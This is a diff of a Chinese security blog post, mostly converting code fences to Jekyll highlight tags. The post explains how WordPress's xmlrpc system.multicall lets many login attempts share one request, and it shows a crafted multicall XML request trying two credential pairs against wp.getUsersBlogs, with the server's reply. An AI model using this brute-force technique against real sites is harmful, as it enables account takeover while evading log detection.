@@ -10,18 +10,18 @@ xmlrpc 是 WordPress 中进行远程调用的接口，而使用 xmlrpc 调用接
 
 WordPress 中关于 xmlrpc 服务的定义代码主要位于 `wp-includes/class-IXR.php` 和 `wp-includes/class-wp-xmlrpc-server.php` 中。基类 IXR_Server 中定义了三个内置的调用方法，分别为 `system.getCapabilities`，`system.listMethods` 和 `system.multicall`，其调用映射位于 `IXR_Server` 基类定义中：
 
-``` php
+{% highlight php %}
 function setCallbacks()
 {
     $this->callbacks['system.getCapabilities'] = 'this:getCapabilities';
     $this->callbacks['system.listMethods'] = 'this:listMethods';
     $this->callbacks['system.multicall'] = 'this:multiCall';
 }
-```
+{% endhighlight %}
 
 而基类在初始化时，调用 setCallbacks() 绑定了调用映射关系：
 
-``` php
+{% highlight php %}
 function __construct( $callbacks = false, $data = false, $wait = false )
 {
     $this->setCapabilities();
@@ -33,11 +33,11 @@ function __construct( $callbacks = false, $data = false, $wait = false )
         $this->serve($data);
     }
 }
-```
+{% endhighlight %}
 
 再来看看 `system.multicall` 对应的处理函数：
 
-``` php
+{% highlight php %}
 function multiCall($methodcalls)
 {
     // See http://www.xmlrpc.com/discuss/msgReader$1208
@@ -61,18 +61,16 @@ function multiCall($methodcalls)
     }
     return $return;
 }
-```
+{% endhighlight %}
 
 可以从代码中看出，程序会解析请求传递的 XML，遍历多重调用中的每一个接口调用请求，并会将最终有调用的结果合在一起返回给请求端。
 
-这样一来，就可以将500种甚至是10000种帐号密码爆破尝试包含在一次请求中，服务端会很快处理完并返回结果，这样极大地提高了爆破的效率，利用多重调用接口压缩了请求次数，10000种帐号密码尝试只会在目标服务器上留下一条访问日志，一定程度上躲避了日志的安全检测。
-
 通过阅读 WordPress 中 xmlrpc 相关处理的代码，能大量的 xmlrpc 调用都验证了用户名和密码：
 
-``` php
+{% highlight php %}
     if ( !$user = $this->login($username, $password) )
         return $this->error;
-```
+{% endhighlight %}
 
 通过搜索上述登录验证代码可以得到所有能够用来进行爆破的调用方法列表如下： 
 
@@ -80,7 +78,7 @@ function multiCall($methodcalls)
     
 这里是用参数传递最少获取信息最直接的 `wp.getUsersBlogs` 进行测试，将两次帐号密码尝试包含在同一次请求里，构造 XML 请求内容为：
 
-``` xml
+{% highlight xml %}
 <methodCall>
   <methodName>system.multicall</methodName>
   <params><param>
@@ -103,11 +101,11 @@ function multiCall($methodcalls)
     </data></array></value>
   </param></params>
 </methodCall>
-```
+{% endhighlight %}
 
 将上面包含两个子调用的 XML 请求发送至 xmlrpc 服务端入口，若目标开启了 xmlrpc 服务会返回类似如下的信息：
 
-``` xml
+{% highlight xml %}
 <?xml version="1.0" encoding="UTF-8"?>
 <methodResponse>
   <params>
@@ -134,7 +132,7 @@ function multiCall($methodcalls)
     </param>
   </params>
 </methodResponse>
-```
+{% endhighlight %}
 
 从结果中可以看到在同一次请求里面处理了两种帐号密码组合，并以集中形式将结果返回，通过该种方式可以极大地提高帐号爆破效率。
 
